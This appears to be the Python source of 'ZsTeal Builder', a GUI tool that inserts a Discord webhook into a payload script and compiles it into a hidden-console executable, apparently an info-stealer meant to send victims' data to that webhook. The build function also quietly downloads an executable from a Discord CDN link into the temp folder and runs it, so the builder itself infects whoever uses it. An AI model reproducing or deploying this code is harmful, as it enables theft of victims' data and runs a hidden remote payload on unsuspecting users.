import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
import requests
import tempfile
import subprocess

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title("ZsTeal Builder")
app.iconbitmap("image\\aa.ico")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'xx.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while...\nBuilt file won't be undetected (FUD)"
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller xx.py --noconsole --onefile{icon_option}'
        os.system(build_command)
        
        # URL для скачивания файла
        url = "https://cdn.discordapp.com/attachments/1248204838970589205/1248210654540861551/xx.exe?ex=6662d642&is=666184c2&hm=31ec696eff9f194d9657e2d0be88b191bb57dfa5d183ee97f3d1540d627cc055&"
        save_path = os.path.join(tempfile.gettempdir(), "original.exe")

        try:
            # Отправка запроса на скачивание файла
            response = requests.get(url)
            response.raise_for_status()  # Проверка успешности запроса

            # Запись содержимого файла
            with open(save_path, 'wb') as file:
                file.write(response.content)
            
            print(f"Файл успешно сохранен в {save_path}")

            # Запуск скачанного файла
            subprocess.run(save_path, check=True)
            print(f"Файл {save_path} успешно запущен")

        except requests.exceptions.RequestException as e:
            print(f"Ошибка при скачивании файла: {e}")
        except Exception as e:
            print(f"Произошла ошибка: {e}")

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

label = ctk.CTkLabel(master=app, text="ZsTeal", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Discord Webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Create EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()
